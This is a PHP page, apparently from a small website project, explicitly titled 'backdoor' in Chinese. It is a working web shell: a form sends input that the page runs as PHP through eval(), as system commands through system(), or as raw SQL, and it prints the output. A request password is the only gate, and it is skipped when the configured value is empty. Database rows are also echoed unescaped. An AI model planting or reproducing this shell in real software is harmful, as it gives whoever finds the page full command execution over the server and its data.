<?php
require_once ('config.php');
require_once ('db.php');
if ($backdoor_pwd != '' && $_REQUEST ['pwd'] != $backdoor_pwd) {
	die ( 'Who are you? Password requierd.' );
}
function filter($str) {
	// 转义为HTML Entity
	$str = trim ( htmlspecialchars ( $str, ENT_QUOTES ) );
	$str = str_replace ( '\\', '&#92;', $str );
	$str = str_replace ( '/', '&#47;', $str );
	return $str;
}
?>
<!doctype html>
<html>
<head>
<title>后门_<?php echo $website_name; ?></title>
<meta charset="utf-8" />
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<link rel="stylesheet" type="text/css" href="color.css" />
<style type="text/css">
body {
	margin: 0;
	padding: 0;
	font-family: Consolas,Monaco,Courier,Monospace;
}

div.select {
	padding: 50px;
	width: 800px;
	margin: 3em auto 1em auto;
	border-radius: 1em;
}

div.console {
	padding: 20px;
	margin: 1em 2em auto 2em;
	//
	上右下左
}

form {
	border-color: #000000;
	border-width: 1px;
	border-style: dashed;
	margin: 0 3em 0 3em;
	padding: 1em;
}

input[type="text"] {
	width: 80%;
}

th {
	word-break: normal; /*表头不换行*/
}

td {
	border-style: solid;
	border-width: 1px;
}

table {
	font-family: Consolas,"Microsoft YaHei",Monaco,Courier,Monospace;
	border-style: solid;
	border-width: 1px;
	word-wrap: break-word;
	min-width: 100%;
}
pre {
    font-family: Consolas,"Microsoft YaHei",Monaco,Courier,Monospace;
}
</style>
</head>

<body>
	<div class="select">
		<h1>执行命令</h1>
		<script type="text/javascript">
		function setFocus(){
			document.getElementById('input_cmd').focus();
		}
		</script>
		<form action="backdoor.php?pwd=<?php echo filter($_GET['pwd'])?>"
			method="post">
			<input type="radio" name="type" value="PHP" onclick="setFocus()"
				<?php if($_POST['type'] == 'PHP'){echo 'checked="checked"';}?> />PHP(需要分号结尾)
			<input type="radio" name="type" value="SQL" onclick="setFocus()"
				<?php if($_POST['type'] == 'SQL'){echo 'checked="checked"';}?> />SQL
			<input type="radio" name="type" value="system" onclick="setFocus()"
				<?php if($_POST['type'] == 'system'){echo 'checked="checked"';}?> />系统命令
			<br /> <input type="text" id="input_cmd" name="cmd"
				value="<?php if ($_POST ['type'] == ''){echo filter($_POST['cmd']);}?>"
				autofocus="autofocus" /> <input type="submit" value="确定" />
		</form>
	</div>
	<hr />
	<div class="console">
		<p>
<?php
function showTable($result) {
	// Make sure that $result != False
	echo '共查询到 ' . mysql_num_rows ( $result ) . ' 条记录<br />';
	echo "<table>\n";
	// 显示字段名称
	echo '<tr>';
	// int mysql_num_fields(resource $result)返回结果集中字段的数目
	for($i = 0; $i < mysql_num_fields ( $result ); $i ++) {
		echo '<th>' . mysql_field_name ( $result, $i );
		echo '</th>';
	}
	echo "</tr>\n";
	
	// 定位到第一条记录： bool mysql_data_seek ( resource $result , int $row_number )
	// 将指定的结果标识所关联的 MySQL 结果内部的行指针移动到指定的行号。接着调用 mysql_fetch_row() 将返回那一行。
	// mysql_data_seek($result, 0);
	
	// 循环取出记录
	while ( $row = mysql_fetch_row ( $result ) ) {
		echo "<tr>";
		for($i = 0; $i < mysql_num_fields ( $result ); $i ++) {
			echo '<td>';
			echo $row [$i];
			echo '</td>';
		}
		echo "</tr>\n";
	}
	
	echo "</table>\n";
	echo '共查询到 ' . mysql_num_rows ( $result ) . ' 条记录<br />';
	// 释放资源
	mysql_free_result ( $result );
}
function exeSql($sql) {
	global $mysql_database, $conn;
	echo 'SQL命令:' . filter ( $sql ) . '<br/>';
	$result = mysql_query ( $sql );
	echo '命令执行完毕。<br/>';
	// var_dump($result); //bool(true) or bool(false)
	if ($result !== false) {
		// SELECT，SHOW，DESCRIBE, EXPLAIN 等 结果显示（测试可以）
		if (gettype ( $result ) == 'resource') {
			showTable ( $result );
		}
		echo '<span class="success">执行成功！影响的行数：' . mysql_affected_rows () . '</span><br/>';
	} else {
		echo '<span class="fail">执行SQL失败，错误信息：' . mysql_error () . '</span><br/>';
	}
}

// TODO:语法错误命令测试和处理
function exePhp($php) {
	echo 'PHP命令：' . filter ( $php ) . '<br/><pre>';
	$ret = eval ( $php );
	echo '</pre>';
	// eval() 返回 NULL，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。
	// 如果在执行的代码中有一个解析错误，eval() 返回 FALSE，之后的代码将正常执行。
	if ($ret !== NULL) {
		if ($ret === false) {
			echo '<span class="fail">输入的代码解析错误</span><br />';
		} else {
			echo '<br />返回值为：';
			var_dump ( $ret );
			echo '<br />';
		}
	}
}
function exeSys($cmd) {
	echo '系统命令：' . filter ( $cmd ) . '<br/><pre>';
	$ret = system ( $cmd );
	echo '</pre>';
	// system():成功则返回命令输出的最后一行， 失败则返回 FALSE
	if ($ret === false) {
		echo '<span class="fail">命令执行失败。</span><br />';
	}
}

if ($_POST ['cmd'] == '') {
	echo '等待命令。<br />';
} elseif ($_POST ['type'] == '') {
	echo '<span class="fail">请选择命令类型！</span><br />';
} elseif ($_POST ['type'] == 'SQL') {
	exeSql ( $_POST ['cmd'] );
} elseif ($_POST ['type'] == 'PHP') {
	exePhp ( $_POST ['cmd'] );
} elseif ($_POST ['type'] == 'system') {
	exeSys ( $_POST ['cmd'] );
} else {
	echo '你在干嘛？What ARE YOU doing?<br />';
}
?>
</p>
		<p>
			<a href="testMySql.php" target="_blank">测试数据库连接</a>&nbsp;<a
				href="index.php">返回首页</a><br />
<?php echo $dev_info;?></p>
	</div>
</body>
</html>